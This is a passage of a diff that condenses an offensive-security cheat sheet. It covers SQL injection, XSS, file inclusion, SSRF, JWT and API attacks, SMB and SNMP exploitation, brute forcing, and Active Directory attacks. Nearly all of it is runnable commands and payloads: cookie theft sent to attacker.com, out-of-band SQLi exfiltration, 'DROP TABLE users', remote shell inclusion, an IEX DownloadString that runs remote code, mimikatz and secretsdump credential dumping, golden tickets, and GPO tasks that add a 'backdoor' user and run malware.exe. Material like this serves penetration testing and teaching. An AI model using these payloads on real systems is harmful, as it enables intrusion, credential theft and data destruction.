-# --technique: Injection techniques (B: Boolean, E: Error, U: Union, S: Stacked, T: Time-based, Q: Inline queries)
-# --tamper: Use tamper scripts to evade WAF
+sqlmap -u "https://target.com/login" --data="username=admin&password=test" --method POST
+# Use: Form testing - POST parameter injection
 
-# Database takeover through SQLi
-sqlmap -u "https://target.com/login" --data="username=admin&password=test" --method POST --dbms=mysql --os-shell
-# Use Case: Full system compromise via SQLi
-# Explanation: Gains operating system shell through SQL injection
+sqlmap -r request.txt --tamper=between,charencode
+# Use: WAF evasion - uses tamper scripts to bypass protections
 
-# Advanced tampering for WAF evasion
-sqlmap -r request.txt --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode
-# Use Case: Testing against protected applications
-# Explanation: Uses multiple tamper scripts to bypass WAF
+sqlmap -u "https://target.com/search" --crawl=2 --forms --dump-all
+# Use: Complete compromise - crawls and extracts all data
 
-# Comprehensive database exploitation
-sqlmap -u "https://target.com/search" --crawl=2 --forms --batch --dump-all --exclude-sysdbs --tamper=space2comment,space2plus,space2randomblank
-# Use Case: Complete database compromise
-# Explanation: Crawls site, tests forms, and extracts all data
+# Manual SQL injection
+# Boolean-based: ' AND 1=1-- 
+# Use: Basic detection - simple true/false testing
 
-# Time-based blind SQLi detection
-sqlmap -u "https://target.com/page?id=1" --technique=T --time-sec=10 --level=5
-# Use Case: Detecting time-based blind SQL injection
+# Time-based: ' AND SLEEP(5)-- 
+# Use: Blind SQLi - time-based detection for blind injection
 
-Manual SQL Injection Techniques
-sql
--- Boolean-based blind SQLi
-' AND 1=1-- 
-' AND 1=2-- 
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'
+# Union-based: ' UNION SELECT 1,2,3-- 
+# Use: Data extraction - union-based data retrieval
 
--- Time-based blind SQLi
-'; WAITFOR DELAY '0:0:5'-- 
-' AND SLEEP(5)-- 
-' || pg_sleep(5)-- 
+# Error-based: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- 
+# Use: Error messages - extracts data through error responses
+```
 
--- Union-based SQLi
-' UNION SELECT 1,2,3-- 
-' UNION SELECT username,password,3 FROM users-- 
-' UNION SELECT table_name,column_name,3 FROM information_schema.columns-- 
+### Cross-Site Scripting (XSS)
+```bash
+# XSStrike
+python3 xsstrike.py -u "https://target.com/search?q=test" --crawl -l 3
+# Use: Automated detection - crawls and tests parameters
 
--- Error-based SQLi
-' AND GTID_SUBSET(@@version,0)-- 
-' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- 
-
--- Stacked queries
-'; DROP TABLE users-- 
-'; INSERT INTO users (username,password) VALUES ('attacker','password')-- 
-
--- Out-of-band data exfiltration
-'; EXEC xp_dirtree '\\attacker.com\share'-- 
-' UNION SELECT LOAD_FILE('\\\\attacker.com\\share\\file.txt')-- 
-
-3.2 Cross-Site Scripting (XSS)
-
-XSStrike - Advanced XSS Detection
-bash
-# Comprehensive XSS scanning
-python3 xsstrike.py -u "https://target.com/search?q=test" --crawl -l 3 --skip
-# Use Case: Automated XSS detection
-# Explanation: Crawls website and tests all parameters for XSS
-
-# Blind XSS detection
 python3 xsstrike.py -u "https://target.com" --fuzzer --blind
-# Use Case: Discovering stored XSS vulnerabilities
-# Explanation: Tests for blind XSS using external callbacks
+# Use: Blind XSS - tests for stored and blind XSS
 
-# Advanced XSS detection
-python3 xsstrike.py -u "https://target.com/contact" --data "name=test&email=test@test.com" --params --skip-dom
-# Use Case: Form-based XSS testing
-# Explanation: Tests POST parameters and skips DOM-based checks
-
-Dalfox - Parameter Analysis & XSS
-bash
-# XSS parameter testing
+# Dalfox
 dalfox url https://target.com/search?q=test
-# Use Case: Quick XSS assessment
-# Explanation: Automatically tests parameters for XSS vulnerabilities
+# Use: Parameter analysis - automatic parameter testing
 
-# Blind XSS with callback
-dalfox url https://target.com -b https://collaborator.com --user-agent "Mozilla/5.0"
-# Use Case: Testing for out-of-band XSS
-# Explanation: Uses external service to detect blind XSS
+dalfox file urls.txt --blind https://collaborator.com
+# Use: Bulk testing - multiple URLs with blind XSS detection
 
-# Advanced scanning options
-dalfox file urls.txt --blind https://collaborator.com --custom-payload xss-payloads.txt --worker 50 --delay 100
-# Use Case: Large-scale XSS testing
-# Explanation: Uses custom payloads with rate limiting
+# XSS Payloads
+# Basic: <script>alert('XSS')</script>
+# Use: Quick test - basic XSS verification
 
-XSS Payload Examples
-html
-<!-- Basic XSS Payloads -->
-<script>alert('XSS')</script>
-<img src=x onerror=alert('XSS')>
-<svg onload=alert('XSS')>
+# Advanced: "><script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
+# Use: Cookie theft - steals cookies through XSS
 
-<!-- Advanced XSS Payloads -->
-"><script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
-javascript:eval('var a=document.createElement(\'script\');a.src=\'http://attacker.com/malicious.js\';document.body.appendChild(a)')
+# Polyglot: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
+# Use: Evasion - complex payload to bypass filters
+```
 
-<!-- DOM XSS Payloads -->
-#"><img src=/ onerror=alert(1)>
-'-alert(1)-'
-\'; alert(1);//
+### File Inclusion & Directory Traversal
+```bash
+# FFuf - Web fuzzing
+ffuf -w common.txt -u https://target.com/FUZZ -mc 200,301,302
+# Use: Directory discovery - finds hidden directories
 
-<!-- Polyglot XSS Payloads -->
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+ffuf -w parameters.txt:PARAM -u https://target.com/endpoint?PARAM=FUZZ
+# Use: Parameter fuzzing - discovers hidden parameters
 
-3.3 File Inclusion & Directory Traversal
+ffuf -w lfi.txt:FUZZ -u "https://target.com/page?file=FUZZ" -mr "root:"
+# Use: LFI testing - tests for local file inclusion
 
-FFuf - Web Fuzzing
-bash
-# Directory bruteforcing
-ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u https://target.com/FUZZ -mc 200,301,302,403 -H "User-Agent: Mozilla/5.0" -t 100
-# Use Case: Discovering hidden web content
-# Explanation: Fuzzes for hidden directories and files
+# LFI Payloads
+# Basic: ../../../../etc/passwd
+# Use: Standard LFI - basic directory traversal
 
-# Parameter fuzzing
-ffuf -w /usr/share/wordlists/parameters.txt:PARAM -u https://target.com/endpoint?PARAM=FUZZ -w /usr/share/wordlists/rockyou.txt:FUZZ -mc all -fr "error"
-# Use Case: Discovering vulnerable parameters
-# Explanation: Fuzzes parameters with multiple wordlists
+# PHP wrappers: php://filter/convert.base64-encode/resource=index.php
+# Use: Source code - reads PHP files through filters
 
-# LFI testing
-ffuf -w /usr/share/wordlists/lfi.txt:FUZZ -u "https://target.com/page?file=FUZZ" -mr "root:" -mc 200
-# Use Case: LFI vulnerability discovery
-# Explanation: Tests for local file inclusion vulnerabilities
+# RFI: http://attacker.com/shell.txt
+# Use: Remote inclusion - includes remote files for code execution
+```
 
-# Recursive directory discovery
-ffuf -w wordlist.txt:FUZZ -u https://target.com/FUZZ -recursion -recursion-depth 2 -e .php,.html,.txt,.bak,.old
-# Use Case: Deep directory structure discovery
-# Explanation: Recursively discovers nested directories
+### Server-Side Request Forgery (SSRF)
+```bash
+# SSRF testing
+ffuf -w ssrf.txt:FUZZ -u "https://target.com/proxy?url=FUZZ" -mc 200
+# Use: SSRF detection - tests various URL formats
 
-Local File Inclusion Payloads
-bash
-# Basic LFI payloads
-../../../../etc/passwd
-....//....//....//....//etc/passwd
-..%2f..%2f..%2f..%2fetc%2fpasswd
+# SSRF Payloads
+# Internal: http://169.254.169.254/latest/meta-data/
+# Use: Cloud metadata - accesses cloud instance metadata
 
-# PHP wrappers for LFI to RCE
-php://filter/convert.base64-encode/resource=index.php
-php://input
-data://text/plain;base64,SSBsb3ZlIFBIUAo=
-expect://id
+# Localhost: http://localhost:22
+# Use: Port scanning - scans internal services
 
-# RFI testing payloads
-http://attacker.com/shell.txt
-http://evil.com/shell.jpg
-\\attacker.com\share\shell.txt
+# DNS rebinding: http://127.0.0.1.nip.io
+# Use: Bypass filters - DNS rebinding to bypass validations
+```
 
-# Windows file paths
-..\..\..\..\windows\system32\drivers\etc\hosts
-C:\Windows\System32\drivers\etc\hosts
-\\?\C:\Windows\System32\drivers\etc\hosts
-
-3.4 Server-Side Request Forgery (SSRF)
-
-SSRF Testing Methodology
-bash
-# Basic SSRF detection
-ffuf -w /usr/share/wordlists/ssrf.txt:FUZZ -u "https://target.com/proxy?url=FUZZ" -mc 200
-# Use Case: SSRF vulnerability discovery
-# Explanation: Tests various URL formats for SSRF
-
-# Advanced SSRF testing with multiple methods
-ffuf -w ssrf-payloads.txt:FUZZ -u "https://target.com/webhook?url=FUZZ" -X POST -H "Content-Type: application/json" -d '{"url":"FUZZ"}' -mc all
-# Use Case: JSON-based SSRF testing
-
-Common SSRF Payloads
-http
-# Internal network scanning
-http://169.254.169.254/latest/meta-data/
-http://localhost:22
-http://127.0.0.1:5984
-http://[::]:22
-http://0.0.0.0:22
-
-# Cloud metadata endpoints
-http://169.254.169.254/latest/user-data
-http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-http://169.254.169.254/latest/dynamic/instance-identity/document
-
-# DNS rebinding attacks
-http://attacker.com:80/redirect=http://localhost:22
-http://localhost.attacker.com
-http://127.0.0.1.nip.io
-
-# URL parser confusion
-http://127.0.0.1@attacker.com
-http://attacker.com#@127.0.0.1
-http://attacker.com?@127.0.0.1
-
-# Special protocols
-gopher://127.0.0.1:25/xHELO%20attacker.com
-dict://127.0.0.1:6379/info
-file:///etc/passwd
-
-3.5 API Attacks
-
-GraphQL Security Testing
-bash
-# GraphQL introspection query
+### API Attacks
+```bash
+# GraphQL testing
 curl -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' https://target.com/graphql
+# Use: Introspection - gets GraphQL schema information
 
-# GraphQL field suggestions
-curl -X POST -H "Content-Type: application/json" -d '{"query":"query { __schema { queryType { fields { name description } } } }"}' https://target.com/graphql
-
-# InQL Scanner for GraphQL
 python3 inql.py -t https://target.com/graphql
+# Use: GraphQL scanner - automated GraphQL testing
 
-REST API Testing
-bash
-# API endpoint discovery
-curl -X OPTIONS https://target.com/api/
-curl -X GET https://target.com/api/
-
-# JWT token attacks
+# JWT attacks
 python3 jwt_tool.py <JWT_TOKEN>
+# Use: JWT analysis - analyzes and manipulates JWT tokens
+
 python3 jwt_tool.py <JWT_TOKEN> -T -hc "kid" -hv "../../dev/null"
-python3 jwt_tool.py <JWT_TOKEN> -X a -pk public.pem
+# Use: Algorithm confusion - exploits JWT algorithm issues
 
-# API rate limit testing
+# Rate limit testing
 for i in {1..100}; do curl -X GET https://target.com/api/endpoint; done
+# Use: DoS testing - checks rate limiting implementation
+```
 
-4.NETWORK EXPLOITATION
-4.1 SMB/Network Service Attacks
+---
 
-CrackMapExec - Network Service Assessment
-bash
-# SMB credential spraying across network
-crackmapexec smb 10.10.10.0/24 -u users.txt -p passwords.txt --continue-on-success
-# Use Case: Network credential brute forcing
-# Explanation: Tests credentials across multiple SMB shares
+## 4. Network Exploitation
 
-# Pass-the-hash attacks
-crackmapexec smb 10.10.10.0/24 -u administrator -H NTLM_HASH -x whoami
-# Use Case: Lateral movement with compromised hashes
-# Explanation: Uses NTLM hashes for authentication without password
+### SMB/Network Service Attacks
+```bash
+# CrackMapExec
+crackmapexec smb 10.10.10.0/24 -u users.txt -p passwords.txt
+# Use: Network spraying - tests credentials across multiple hosts
 
-# Share enumeration and analysis
-crackmapexec smb 10.10.10.5 -u user -p password --shares --sessions --loggedon-users
-# Use Case: Network share discovery and session enumeration
-# Explanation: Lists available SMB shares and active sessions
+crackmapexec smb 10.10.10.0/24 -u administrator -H NTLM_HASH
+# Use: Pass-the-hash - lateral movement with hashes
 
-# Advanced SMB attacks
-crackmapexec smb 10.10.10.0/24 -u user -p password -M invoke_sessiongopher -M get_keystrokes
-# Use Case: Advanced credential harvesting
-# Explanation: Uses multiple modules for comprehensive attacks
+crackmapexec smb 10.10.10.5 -u user -p password --shares --sessions
+# Use: Share enumeration - lists SMB shares and sessions
 
-# MSSQL service attacks
 crackmapexec mssql 10.10.10.0/24 -u sa -p password --query "SELECT name FROM master..sysdatabases"
-# Use Case: Database server enumeration
-# Explanation: Executes SQL queries on MSSQL servers
+# Use: Database access - executes SQL queries on MSSQL
 
-# WinRM service attacks
-crackmapexec winrm 10.10.10.0/24 -u user -p password -d domain -x "whoami /all"
-# Use Case: Remote command execution via WinRM
-
-Impacket - Network Service Exploitation
-bash
-# SMB execution with pass-the-hash
+# Impacket
 python3 psexec.py -hashes LMHASH:NTHASH domain/user@target_ip
-# Use Case: Remote code execution on Windows systems
-# Explanation: Remotely executes commands via SMB
+# Use: Remote execution - SMB-based command execution
 
-# WMI execution for remote management
 python3 wmiexec.py -hashes LMHASH:NTHASH domain/user@target_ip
-# Use Case: Alternative execution method when SMB is blocked
-# Explanation: Uses WMI for command execution
+# Use: WMI execution - alternative to SMB execution
 
-# MSSQL client with Windows authentication
 python3 mssqlclient.py -windows-auth domain/user:password@target_ip
-# Use Case: Database server exploitation
-# Explanation: MSSQL client with Windows authentication
+# Use: MSSQL client - database server access
 
-# DCOM execution for lateral movement
-python3 dcomexec.py -hashes LMHASH:NTHASH domain/user@target_ip
-# Use Case: Lateral movement via DCOM
-# Explanation: Uses Distributed COM for execution
-
-# SSH execution for Linux systems
-python3 ssh_exec.py -hashes LMHASH:NTHASH user@target_ip
-# Use Case: Linux remote command execution
-
-SMBMap - SMB Share Enumeration
-bash
-# SMB share listing
+# SMBMap
 smbmap -H 10.10.10.5 -u user -p password
-# Use Case: SMB share discovery and permissions analysis
-# Explanation: Lists all available shares and access rights
+# Use: Share listing - enumerates SMB shares and permissions
 
-# Recursive share browsing
 smbmap -H 10.10.10.5 -u user -p password -R ShareName
-# Use Case: Deep share content enumeration
-# Explanation: Recursively lists files and directories
+# Use: Recursive listing - lists all files in share
+```
 
-# Download files from shares
-smbmap -H 10.10.10.5 -u user -p password --download FileName
-# Use Case: Data exfiltration from SMB shares
-# Explanation: Downloads files from accessible shares
-
-# Upload files to shares
-smbmap -H 10.10.10.5 -u user -p password --upload local.txt remote.txt
-# Use Case: Delivering payloads via SMB
-# Explanation: Uploads files to writable shares
-
-4.2 SNMP & Network Protocols
-
-SNMP Enumeration
-bash
-# SNMP community string brute force
+### SNMP & Network Protocols
+```bash
+# SNMP enumeration
 onesixtyone -c community.txt -i targets.txt
-# Use Case: Network device reconnaissance
-# Explanation: Brute forces SNMP community strings
+# Use: Community string brute force - finds SNMP communities
 
-# SNMP walk for comprehensive data
 snmpwalk -c public -v1 10.10.10.5 1.3.6.1.2.1.1.5.0
-# Use Case: Network device information gathering
-# Explanation: Queries SNMP for system information
+# Use: System information - gets system details via SNMP
 
-# SNMP user enumeration and analysis
 snmp-check 10.10.10.5 -c public
-# Use Case: Network device security assessment
-# Explanation: Comprehensive SNMP information extraction
+# Use: Comprehensive SNMP - extensive SNMP information gathering
 
-# SNMPv3 enumeration
-snmpwalk -v3 -l authPriv -u user -a SHA -A authpass -x AES -X privpass 10.10.10.5
-# Use Case: SNMPv3 security testing
-# Explanation: Tests SNMPv3 authentication and privacy
-
-# Specific MIB queries
-snmpwalk -c public -v1 10.10.10.5 1.3.6.1.2.1.25.1.6.0  # System processes
-snmpwalk -c public -v1 10.10.10.5 1.3.6.1.2.1.25.4.2.1.2  # Running programs
-snmpwalk -c public -v1 10.10.10.5 1.3.6.1.2.1.6.13.1.3    # TCP connections
-
-Network Protocol Fuzzing
-bash
-# TFTP file enumeration
+# Network protocols
 tftp 10.10.10.5
 get /etc/passwd
-put shell.php
+# Use: TFTP file transfer - file download via TFTP
 
-# NFS share enumeration
 showmount -e 10.10.10.5
-mount -t nfs 10.10.10.5:/share /mnt/nfs
+# Use: NFS enumeration - lists NFS shares
 
-# LDAP enumeration
 ldapsearch -h 10.10.10.5 -x -b "dc=domain,dc=local"
-ldapsearch -h 10.10.10.5 -x -b "dc=domain,dc=local" "(objectClass=user)"
+# Use: LDAP enumeration - queries LDAP directory
+```
 
-4.3 Remote Service Exploitation
-
-Metasploit - Network Service Exploitation
-bash
-# SSH service brute force
+### Remote Service Exploitation
+```bash
+# Metasploit
 use auxiliary/scanner/ssh/ssh_login
 set USERNAME root
 set PASS_FILE /usr/share/wordlists/rockyou.txt
-set RHOSTS 10.10.10.0/24
 run
+# Use: Service brute force - credential testing for various services
 
-# FTP service exploitation
-use auxiliary/scanner/ftp/ftp_login
-set USERNAME anonymous
-set RHOSTS 10.10.10.0/24
-run
+# Hydra
+hydra -L users.txt -P passwords.txt ssh://10.10.10.10
+# Use: Network brute force - fast credential spraying
 
-# Telnet service attacks
-use auxiliary/scanner/telnet/telnet_login
-set USERNAME root
-set PASS_FILE /usr/share/wordlists/rockyou.txt
-set RHOSTS 10.10.10.0/24
-run
-
-# RDP service scanning
-use auxiliary/scanner/rdp/rdp_scanner
-set RHOSTS 10.10.10.0/24
-run
-
-Hydra - Network Service Brute Force
-bash
-# SSH brute force
-hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4 -V -f
-# Use Case: SSH credential brute forcing
-# Explanation: Tests multiple credentials against SSH service
-
-# FTP brute force
-hydra -l admin -P rockyou.txt ftp://10.10.10.10
-# Use Case: FTP service attacks
-# Explanation: Brute forces FTP credentials
-
-# RDP attacks
-hydra -l administrator -P passwords.txt rdp://10.10.10.10
-# Use Case: Remote Desktop Protocol attacks
-# Explanation: Tests RDP credentials
-
-# HTTP form attacks
 hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
-# Use Case: Web application login brute forcing
-# Explanation: Tests web form credentials
+# Use: Web form brute force - HTTP form credential testing
 
-# Multiple service attacks
-hydra -C creds.txt -M targets.txt -t 10 -W 1 -F
-# Use Case: Large-scale credential testing
-# Explanation: Uses credential files and target lists
+hydra -C creds.txt -M targets.txt -t 10
+# Use: Bulk testing - multiple credentials against multiple targets
+```
 
-5.ACTIVE DIRECTORY ATTACKS
+---
 
-5.1 Kerberos Attacks
+## 5. Active Directory Attacks
 
-Rubeus - Kerberos Exploitation
-bash
-# Kerberoasting - Service account attack
-Rubeus.exe kerberoast /user:svc_account /domain:domain.local /dc:DC_IP /outfile:hashes.txt /format:hashcat
-# Use Case: Service account password cracking
-# Explanation: Requests service tickets and extracts crackable hashes
+### Kerberos Attacks
+```bash
+# Rubeus
+Rubeus.exe kerberoast /user:svc_account /domain:domain.local
+# Use: Kerberoasting - gets service tickets for cracking
 
-# AS-REP Roasting - Pre-auth disabled accounts
-Rubeus.exe asreproast /format:hashcat /outfile:asrephashes.txt
-# Use Case: User account compromise
-# Explanation: Attacks accounts with pre-authentication disabled
+Rubeus.exe asreproast /format:hashcat
+# Use: AS-REP roasting - attacks pre-auth disabled accounts
 
-# Golden ticket creation for persistence
-Rubeus.exe golden /rc4:KRBTGT_HASH /domain:domain.local /sid:S-1-5-21-... /user:administrator /id:500 /ptt
-# Use Case: Domain persistence and privilege escalation
-# Explanation: Creates forged Kerberos tickets for domain persistence
+Rubeus.exe golden /rc4:KRBTGT_HASH /domain:domain.local /user:administrator /ptt
+# Use: Golden ticket - creates forged TGT for persistence
 
-# Silver ticket creation for specific services
-Rubeus.exe silver /rc4:MACHINE_HASH /domain:domain.local /sid:S-1-5-21-... /user:user /service:cifs /target:dc.domain.local /ptt
-# Use Case: Service-specific access
-# Explanation: Creates silver tickets for specific services
+Rubeus.exe silver /rc4:MACHINE_HASH /domain:domain.local /user:user /service:cifs /target:dc.domain.local /ptt
+# Use: Silver ticket - creates service-specific tickets
 
-# Ticket passing and manipulation
 Rubeus.exe ptt /ticket:base64_ticket
-# Use Case: Lateral movement with stolen tickets
-# Explanation: Injects Kerberos tickets into current session
+# Use: Pass-the-ticket - injects Kerberos tickets
 
-# Ticket harvesting and monitoring
-Rubeus.exe harvest /interval:30
-# Use Case: Continuous ticket collection
-# Explanation: Monitors for and harvests Kerberos tickets
-
-# S4U2Self and S4U2Proxy attacks
-Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/dc.domain.local /ptt
-# Use Case: Privilege escalation through service delegation
-# Explanation: Uses constrained delegation for impersonation
-
-Impacket Kerberos Utilities
-bash
-# Get user SPNs for Kerberoasting
+# Impacket Kerberos
 python3 GetUserSPNs.py -request -dc-ip DC_IP domain/user:password
-# Use Case: Kerberoasting from Linux systems
-# Explanation: Requests service tickets for cracking
+# Use: Kerberoasting from Linux - service ticket requests
 
-# Golden ticket attack from Linux
-python3 ticketer.py -nthash HASH -domain-sid S-1-5-21-... -domain domain.local administrator
-# Use Case: Domain compromise persistence
-# Explanation: Creates golden tickets for persistence
+python3 ticketer.py -nthash HASH -domain-sid SID -domain domain.local administrator
+# Use: Ticket creation - golden/silver tickets from Linux
+```
 
-# Silver ticket attack
-python3 ticketer.py -nthash MACHINE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/dc.domain.local user
-# Use Case: Service-specific access
-# Explanation: Creates silver tickets for specific services
-
-# Kerberos password spraying
-python3 kerbrute.py -domain domain.local -users users.txt -passwords passwords.txt -dc-ip DC_IP
-# Use Case: Domain credential attacks
-# Explanation: Performs Kerberos pre-authentication spraying
-
-# Golden PAC attack
-python3 goldenPac.py domain/user:password@target_ip
-# Use Case: Domain controller compromise
-# Explanation: Combines golden ticket with PSExec
-
-5.2 DCSync & Credential Theft
-
-Mimikatz - Credential Extraction
-cmd
-# DCSync attack for domain credential theft
+### DCSync & Credential Theft
+```bash
+# Mimikatz
 mimikatz # lsadump::dcsync /domain:domain.local /user:administrator
-# Use Case: Domain admin credential theft
-# Explanation: Simulates domain controller replication to extract credentials
+# Use: DCSync attack - extracts domain credentials
 
-# LSASS memory dumping for credential extraction
 mimikatz # sekurlsa::logonpasswords
-# Use Case: Post-exploitation credential gathering
-# Explanation: Extracts credentials from LSASS memory
+# Use: Credential dumping - extracts passwords from memory
 
-# SAM database extraction
 mimikatz # lsadump::sam
-# Use Case: Local user credential theft
-# Explanation: Dumps local SAM database
+# Use: SAM database - dumps local user credentials
 
-# LSA secrets extraction
 mimikatz # lsadump::secrets
-# Use Case: System credential discovery
-# Explanation: Extracts LSA secrets from registry
+# Use: LSA secrets - extracts system secrets
 
-# Kerberos ticket extraction
-mimikatz # kerberos::list
-# Use Case: Ticket harvesting for lateral movement
-# Explanation: Lists current Kerberos tickets
-
-# Certificate extraction for PKI attacks
-mimikatz # crypto::certificates /export
-# Use Case: Certificate-based persistence
-# Explanation: Exports certificates for PKI attacks
-
-# DPAPI master key extraction
-mimikatz # dpapi::masterkey
-# Use Case: Protected data decryption
-# Explanation: Extracts DPAPI master keys for credential decryption
-
-# Vault credential extraction
-mimikatz # vault::cred
-# Use Case: Web browser and application credential theft
-# Explanation: Extracts credentials from Windows Vault
-
-SecretsDump - Credential Extraction
-bash
-# DCSync from Linux systems
+# SecretsDump
 python3 secretsdump.py -just-dc-ntlm domain/user:password@DC_IP
-# Use Case: Domain credential extraction from Linux
-# Explanation: Performs DCSync attack to extract NTLM hashes
+# Use: DCSync from Linux - extracts NTLM hashes
 
-# Local credential dumping from remote system
 python3 secretsdump.py -hashes LMHASH:NTHASH domain/user@target_ip
-# Use Case: Lateral movement credential gathering
-# Explanation: Dumps credentials from remote system
+# Use: Remote dumping - credentials from remote system
+```
 
-# NTDS.dit file extraction
-python3 secretsdump.py -ntds ntds.dit -system system.hive LOCAL
-# Use Case: Offline domain credential analysis
-# Explanation: Extracts credentials from NTDS database
+### BloodHound & AD Mapping
+```bash
+# SharpHound
+SharpHound.exe --collectionmethods All --domain domain.local
+# Use: AD data collection - comprehensive relationship data
 
-# Keytab file creation
-python3 secretsdump.py -krbtgt -keytab output.keytab domain/user:password@DC_IP
-# Use Case: Kerberos keytab generation
-# Explanation: Creates keytab files for authentication
+SharpHound.exe -c DCOnly -d domain.local --stealth
+# Use: Stealth collection - minimal footprint data gathering
 
-5.3 BloodHound & AD Relationship Mapping
+# BloodHound Cypher
+MATCH p=shortestPath((m:Computer)-[*1..]->(n:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
+# Use: Attack path finding - shortest path to high privileges
 
-SharpHound - Data Collection
-powershell
-# Comprehensive Active Directory data collection
-SharpHound.exe --collectionmethods All --domain domain.local --ldapusername user --ldappassword pass --zipfilename output.zip
-# Use Case: AD attack path discovery
-# Explanation: Collects Active Directory relationship data for analysis
-
-# Stealthy data collection
-SharpHound.exe -c DCOnly -d domain.local --zipfilename output.zip --stealth
-# Use Case: Minimal footprint data collection
-# Explanation: Stealthy AD reconnaissance
-
-# Session collection for lateral movement planning
-SharpHound.exe --collectionmethods Session,LoggedOn --domain domain.local
-# Use Case: Lateral movement planning
-# Explanation: Collects user session information
-
-# Group Policy collection
-SharpHound.exe --collectionmethods GPOLocalGroup --domain domain.local
-# Use Case: Group Policy analysis
-# Explanation: Collects Group Policy information
-
-# Computer and user enumeration
-SharpHound.exe --collectionmethods Computer,Group,User --domain domain.local
-# Use Case: AD object enumeration
-# Explanation: Collects computer, group, and user data
-
-BloodHound Cypher Queries
-cypher
-// Find shortest path to Domain Admins
-MATCH p=shortestPath((m:Computer)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword*1..]->(n:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
-
-// Find users with path to high-value groups
-MATCH (u:User), (g:Group {highvalue:true}), p=shortestPath((u)-[*1..]->(g)) RETURN p
-
-// Find systems where Domain Admins have sessions
-MATCH p=(m:User)-[r:HasSession]->(n:Computer {highvalue:true}) RETURN p
-
-// Find users with DCSync rights
-MATCH (u:User), (d:Domain), p=(u)-[:GetChanges|GetChangesAll|AllExtendedRights]->(d) RETURN p
-
-// Find computers with Unconstrained Delegation
 MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
+# Use: Unconstrained delegation - finds systems with delegation
 
-// Find users with path to Unconstrained Delegation systems
-MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {unconstraineddelegation:true})) RETURN p
+# PowerView
+Get-DomainUser -Properties samaccountname,lastlogon,memberof
+# Use: User enumeration - gets user information
 
-// Find Group Policy modification rights
-MATCH p=(u:User)-[:WriteOwner|WriteDacl|GenericWrite|GenericAll|Owns]->(g:GPO) RETURN p
-
-PowerView - Active Directory Reconnaissance
-powershell
-# Import PowerView
-IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')
-
-# Domain trust enumeration
-Get-DomainTrust -API
-Get-DomainTrustMapping
-Get-ForestTrust
-
-# User enumeration and analysis
-Get-DomainUser -Properties samaccountname,description,lastlogon,pwdlastset,memberof
-Get-DomainUser -SPN | select samaccountname,serviceprincipalname
-Get-DomainUser -AllowDelegation
-Get-DomainUser -PreauthNotRequired
-
-# Group enumeration
-Get-DomainGroupMember -Identity "Domain Admins"
-Get-DomainGroup -AdminCount
-Get-DomainLocalGroup -ComputerName dc.domain.local
-
-# Computer enumeration
-Get-NetComputer -OperatingSystem "*Server*" | Get-NetLoggedon
 Get-DomainComputer -Unconstrained
-Get-DomainComputer -TrustedForDelegation
+# Use: Computer enumeration - finds specific computer types
 
-# ACL and permission analysis
 Find-InterestingDomainAcl
-Get-DomainObjectAcl -Identity "Domain Admins" | ? {$_.ActiveDirectoryRights -match "GenericAll"}
+# Use: ACL analysis - finds interesting permissions
+```
 
-# GPO analysis
-Get-DomainGPO -Properties displayname,whenchanged
-Get-DomainGPOUserLocalGroupMapping -Identity "Default Domain Policy"
-
-5.4 Group Policy Attacks
-
-GPO Abuse and Exploitation
-powershell
+### Group Policy Attacks
+```bash
 # GPO enumeration
 Get-DomainGPO -Properties displayname,whenchanged
-Get-DomainGPOComputerLocalGroupMapping -Identity "TestGPO"
+# Use: GPO discovery - lists Group Policy Objects
 
-# GPO creation and modification
-New-GPOImmediateTask -TaskName "Update" -Command "cmd.exe" -Arguments "/c malware.exe" -GPODisplayName "TestGPO"
+# GPO abuse
+New-GPOImmediateTask -TaskName "Update" -Command "cmd.exe" -Arguments "/c malware.exe"
+# Use: Task creation - adds scheduled tasks through GPO
 
-# GPO backup and restore for persistence
-Backup-Gpo -Name "Default Domain Policy" -Path C:\temp\
-Import-Gpo -BackupId "GUID" -TargetName "Compromised Policy" -Path C:\temp\
+# SharpGPOAbuse
+SharpGPOAbuse.exe --AddUserTask --TaskName "Update" --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add"
+# Use: Automated abuse - adds users through GPO
 
-# Scheduled task through GPO
-$gpo = Get-GPO -Name "TestGPO"
-$task = @"
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <Triggers>
-    <LogonTrigger>
-      <Enabled>true</Enabled>
-    </LogonTrigger>
-  </Triggers>
-  <Actions Context="Author">
-    <Exec>
-      <Command>cmd.exe</Command>
-      <Arguments>/c "C:\Windows\System32\malware.exe"</Arguments>
-    </Exec>
-  </Actions>
-</Task>
-"@
+SharpGPOAbuse.exe --AddStartupScript --ScriptName "startup.bat" --ScriptContent "malware.exe"
+# Use: Startup script - adds scripts through GPO
+```
 
-SharpGPOAbuse - GPO Exploitation
-bash
-# Add user to local group through GPO
-SharpGPOAbuse.exe --AddUserTask --TaskName "Update" --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add" --GPOName "TestGPO"
+---
 
